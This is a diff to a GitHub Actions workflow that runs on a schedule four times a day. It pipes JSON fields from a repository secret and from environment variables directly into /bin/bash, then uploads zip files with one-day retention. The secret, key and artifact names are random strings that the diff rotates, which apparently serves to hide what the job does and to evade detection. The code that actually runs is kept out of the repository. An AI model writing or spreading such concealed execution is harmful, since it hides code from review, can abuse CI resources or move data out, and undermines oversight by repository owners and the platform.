@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '22 0,6,12,18 * * *'
+    - cron: '43 4,10,16,22 * * *'
 env:
   CI: true
 jobs:
@@ -15,15 +15,14 @@ jobs:
           fetch-depth: 0
       - name: Main step
         env:
-          bklr08598: ${{ secrets.bklr08598 }}
+          b443: ${{ secrets.b443 }}
         run: |
-          printf '%s' "$bklr08598" | jq -r .jaltp730 | /bin/bash
-          printf '%s' "$sv2" | jq -r .q870 | /bin/bash
-          echo $gdax2810 | jq -r .vocs2 | /bin/bash
+          printf '%s' "$b443" | jq -r .h29 | /bin/bash
+          echo $fd7 | jq -r .q708 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
         with:
-          name: K1qdswhS
+          name: rHgWlhvk
           path: "*.zip"
           retention-days: 1
